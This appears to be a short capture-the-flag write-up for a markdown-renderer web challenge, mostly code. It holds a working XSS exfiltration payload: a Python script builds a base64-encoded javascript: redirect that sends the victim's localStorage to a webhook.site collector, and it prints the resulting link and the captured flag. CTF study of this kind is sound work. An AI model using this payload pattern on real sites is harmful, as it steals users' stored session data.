---
created: 2025-06-07T16:01
updated: 2025-06-08T12:05
solves: 22
points: 484
---

Me and my teammate @T!T4N was working on this at the same time.

```html
<form action="https://webhook.site/0f905088-02bb-4116-842b-9376cd7fdc66">
<textarea name="{test}" id="markdown" style="height: 346px; width: 462px;"></textarea>
<input name="test" value="123"/>

<button type="submit">
<div id="markdownList">
<li><a>hewoo</a></li>
</div>
</button>
</form>
```

I was thinking about forms and was looking at registration page when @T!T4N found XSS via registration page lmao.

However his payload had trouble working on remote so I solved it.

```python
import base64
from urllib.parse import quote_plus

b64payload = base64.b64encode("""
location.href="https://webhook.site/0f905088-02bb-4116-842b-9376cd7fdc66?p="+JSON.stringify(localStorage)
""".encode()).decode()

payload = quote_plus(f"javascript:eval(atob('{b64payload}'))")


print(f"""
<ul id="markdownList">
    <li><a href="https://markdown-renderer.tjc.tf/register?redirect={payload}" target="_blank">CLICK</a>
    </li>
</ul>
""")
```

```html
<ul id="markdownList">
    <li><a href="https://markdown-renderer.tjc.tf/register?redirect=javascript%3Aeval%28atob%28%27CmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd2ViaG9vay5zaXRlLzBmOTA1MDg4LTAyYmItNDExNi04NDJiLTkzNzZjZDdmZGM2Nj9wPSIrSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKQo%3D%27%29%29" target="_blank">CLICK</a>
    </li>
</ul>
```

```flag
tjctf{sup3r_m4rked_1n_html_ea3c22e841b}
```
